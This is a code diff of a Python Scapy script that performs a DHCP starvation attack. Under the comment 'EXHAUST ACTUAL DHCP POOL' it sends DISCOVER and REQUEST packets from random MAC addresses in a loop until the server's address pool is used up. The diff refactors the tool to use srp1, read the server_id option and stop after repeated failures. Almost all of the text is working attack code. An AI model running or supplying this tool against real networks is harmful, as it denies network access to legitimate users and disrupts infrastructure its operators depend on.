@@ -9,41 +9,9 @@ conf.checkIPaddr = False
 
 # EXHAUST ACTUAL DHCP POOL
 def exhaust():
-    i = 0
     loop = True
     xid = 0
-
-    # FIND DHCP IP
-    MAC_ADDR = str(RandMAC())
-    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff') \
-                    / IP(src='0.0.0.0', dst='255.255.255.255') \
-                    / UDP(sport=68, dport=67) \
-                    / BOOTP(op=1, chaddr=MAC_ADDR, xid=xid) \
-                    / DHCP(options=[('message-type', 'discover'), ('end')])
-    sendp(dhcp_discover, iface=source_interface, verbose=0, count=1)
-    offer = sniff(filter="port 68 and port 67",lfilter=lambda p: (p["BOOTP"].siaddr == p["IP"].src and p["BOOTP"].xid == xid), iface=source_interface, timeout=5, count=1)
-    try:
-        offer_addr = offer[0]["BOOTP"].yiaddr
-        offer_servaddr = offer[0]["BOOTP"].siaddr
-    except:
-        return
-
-    # ACCEPT OFFER
-    dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff') \
-                    / IP(src='0.0.0.0', dst='255.255.255.255') \
-                    / UDP(sport=68, dport=67) \
-                    / BOOTP(op=1, xid=xid, chaddr=MAC_ADDR) \
-                    / DHCP(options=[("message-type", "request"),
-                                    ("requested_addr", offer_addr),
-                                    ("server_id", offer_servaddr),
-                                    "end"])
-
-    sendp(dhcp_request, iface=source_interface, verbose=0, count=1)
-    ack = sniff(filter=f"src host {offer_servaddr} and port 68 and port 67", lfilter=lambda p: (p["BOOTP"].xid == xid) , iface=source_interface, timeout=10, count=1)
-    i += 1
-    print(f"Packets sent : {i}\r")
-
-
+    error = 0
     # LOOP ONCE DHCP IP IS KNOWN
 
     while loop:
@@ -63,30 +31,40 @@ def exhaust():
                         / UDP(sport=68, dport=67) \
                         / BOOTP(op=1, chaddr=MAC_ADDR, xid=xid) \
                         / DHCP(options=[('message-type', 'discover'), ('end')])
-        sendp(dhcp_discover, iface=source_interface, verbose=0, count=1)
+
+        offer = srp1(dhcp_discover, filter="port 68 and port 67", iface=source_interface, verbose=0, timeout=2)
 
         # SNIFF OFFER
-        offer = sniff(filter=f"src host {offer_servaddr} and port 68 and port 67", iface=source_interface, timeout=10, count=1)
         try:
-            offer_addr = offer[0]["BOOTP"].yiaddr
-            offer_servaddr = offer[0]["BOOTP"].siaddr
+            offer_ip = offer["IP"].src
+            offer_addr = offer["BOOTP"].yiaddr
+            for opt in range(len(offer["DHCP"].options)):
+                if offer["DHCP"].options[opt][0] == "server_id":
+                    offer_ser_id = offer["DHCP"].options[opt][1]
 
             # ACCEPT OFFER
             dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff') \
-                            / IP(src='0.0.0.0', dst='255.255.255.255') \
+                            / IP(src='0.0.0.0', dst="255.255.255.255") \
                             / UDP(sport=68, dport=67) \
                             / BOOTP(op=1, xid=xid, chaddr=MAC_ADDR) \
                             / DHCP(options=[("message-type", "request"),
                                             ("requested_addr", offer_addr),
-                                            ("server_id", offer_servaddr),
+                                            ("server_id", offer_ser_id),
                                             "end"])
 
-            sendp(dhcp_request, iface=source_interface, verbose=0, count=1)
-            ack = sniff(filter=f"src host {offer_servaddr} and port 68 and port 67", lfilter=lambda p: (p["BOOTP"].xid == xid) , iface=source_interface, timeout=10, count=1)
-            i += 1
-            print(f"Packets sent : {i}\r")
+            ack = srp1(dhcp_request, filter=f"src host {offer_ip} and port 68 and port 67", iface=source_interface, verbose=0, timeout=2)
+            if ack != None:
+                print("ACK received\r", end = '')
+            else:
+                print("no ACK received\r")
+                error += 1
+                if error == 5:
+                    return
         except:
-            loop=False
+            print("no Discover response\r")
+            error += 1
+            if error == 5:
+                return
 
 if __name__ == "__main__":
     exhaust()
